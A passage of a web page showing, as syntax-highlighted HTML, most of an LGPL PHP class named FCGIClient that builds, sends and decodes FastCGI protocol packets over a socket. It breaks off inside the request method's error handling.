class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note : Code is released under the GNU LGPL</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Please do not change the header of this file</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="hljs-comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="hljs-comment"> * the License, or (at your option) any later version.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="hljs-comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the GNU Lesser General Public License for more details.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Handles communication with a FastCGI application</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="hljs-doctag">@webstart</span>.fr&gt; </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>     1.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FCGIClient</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VERSION_1</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BEGIN_REQUEST</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ABORT_REQUEST</span>        = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">END_REQUEST</span>          = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PARAMS</span>               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDIN</span>                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDOUT</span>               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDERR</span>               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DATA</span>                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES</span>           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES_RESULT</span>    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_TYPE</span>         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAXTYPE</span>              = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">UNKNOWN_TYPE</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RESPONDER</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AUTHORIZER</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FILTER</span>               = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REQUEST_COMPLETE</span>     = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CANT_MPX_CONN</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">OVERLOADED</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_ROLE</span>         = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_CONNS</span>            = <span class="hljs-string">&#x27;MAX_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_REQS</span>             = <span class="hljs-string">&#x27;MAX_REQS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MPXS_CONNS</span>           = <span class="hljs-string">&#x27;MPXS_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HEADER_LEN</span>           = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Socket</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Resource</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sock</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Host</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_host</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Port</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Integer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_port</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Keep Alive</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Boolean</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_keepAlive</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $host Host of the FastCGI application</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $port Port of the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span> = <span class="hljs-number">9000</span></span>) // <span class="hljs-title">and</span> <span class="hljs-title">default</span> <span class="hljs-title">value</span> <span class="hljs-title">for</span> <span class="hljs-title">port</span>, <span class="hljs-title">just</span> <span class="hljs-title">for</span> <span class="hljs-title">unixdomain</span> <span class="hljs-title">socket</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_host = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;_port = <span class="hljs-variable">$port</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="hljs-comment">     * alive at the end of a request</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setKeepAlive</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_keepAlive = (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;_sock);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the keep alive status</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeepAlive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;_keepAlive;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a connection to the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_sock = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$this</span>-&gt;_host, <span class="hljs-variable">$this</span>-&gt;_port, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unable to connect to FastCGI application&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build a FastCGI packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $type Type of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $content Content of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $requestId RequestId</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$clen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">VERSION_1</span>)         <span class="hljs-comment">/* version */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$clen</span> &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xFF</span>)     <span class="hljs-comment">/* contentLengthB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$clen</span> &amp; <span class="hljs-number">0xFF</span>)             <span class="hljs-comment">/* contentLengthB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>            . <span class="hljs-variable">$content</span>;                     <span class="hljs-comment">/* content */</span><br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build an FastCGI Name value pair</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $name Name</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $value Value</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String FastCGI Name value pair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$nlen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$vlen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) &#124; <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) &#124; <span class="hljs-number">0x80</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Decode a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data String containing all the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodePacketHeader</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;version&#x27;</span>]       = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">0</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;type&#x27;</span>]          = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">1</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;requestId&#x27;</span>]     = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">2</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">3</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">4</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">5</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">6</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;reserved&#x27;</span>]      = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">7</span>&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPacket</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$packet</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HEADER_LEN</span>)) &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">decodePacketHeader</span>(<span class="hljs-variable">$packet</span>);<br>            <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$len</span>  = <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>];<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &amp;&amp; <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$len</span>)) &#123;<br>                    <span class="hljs-variable">$len</span> -= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$buf</span>);<br>                    <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] .= <span class="hljs-variable">$buf</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$buf</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$resp</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Execute a request to the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $params Array of parameters</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $stdin Content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>        <span class="hljs-variable">$request</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">BEGIN_REQUEST</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">RESPONDER</span>) . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$this</span>-&gt;_keepAlive) . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>));<br>        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildNvpair</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-variable">$paramsRequest</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">PARAMS</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-variable">$stdin</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildPacket</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDIN</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;_sock, <span class="hljs-variable">$request</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readPacket</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDOUT</span> &#124;&#124; <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STDERR</span>) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$resp</span> &amp;&amp; <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">END_REQUEST</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$resp</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Bad request&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>]&#123;<span class="hljs-number">4</span>&#125;)) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CANT_MPX_CONN</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;This app can not multiplex [CANT_MPX_CONN]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">OVERLOADED</span>:<br>           